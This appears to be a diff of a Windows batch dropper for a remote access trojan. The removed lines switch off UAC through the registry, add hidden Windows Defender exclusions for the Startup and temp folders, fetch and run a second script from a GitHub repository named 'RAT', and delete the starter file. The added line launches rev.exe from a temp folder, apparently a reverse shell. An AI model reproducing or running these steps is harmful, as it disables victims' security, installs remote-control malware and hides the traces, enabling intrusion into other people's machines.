@@ -1,4 +1,3 @@
-@REM TODO: add UAC bypass
 @echo off
 @REM change me
 @rem set "username=saifa"
@@ -25,9 +24,5 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"
-curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat
-powershell ./secondary.bat
-del Starter.bat
+
+C:\Users\%username%\AppData\Local\Temp\MicroWindows\rev.exe
